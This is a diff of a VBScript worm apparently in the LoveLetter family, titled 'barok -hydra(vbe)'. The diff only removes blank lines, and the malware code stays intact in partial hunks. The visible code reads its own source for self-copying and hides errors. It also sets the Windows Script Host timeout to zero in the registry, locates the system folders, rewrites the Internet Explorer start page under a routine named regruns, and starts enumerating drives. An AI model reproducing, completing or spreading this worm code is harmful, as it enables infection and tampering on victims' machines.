@@ -1,12 +1,9 @@
 em  barok -hydra(vbe) <i hate go to school>
-
 On Error Resume Next
-
 
 Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
 eq = ""
 ctr = 0
-
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
@@ -14,24 +11,19 @@ vbscopy = file.ReadAll
 
 main()
 
-
 Sub main()
   On Error Resume Next
   Dim wscr, rr
 
-  
   Set wscr = CreateObject("WScript.Shell")
   
   rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 
-  
   If (rr >= 1) Then
-
-  
+    
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
   End If
 
-  
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
@@ -84,7 +76,6 @@ Sub regruns()
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
   End If
 End Sub
-
 
 Sub listadriv()
   On Error Resume Next
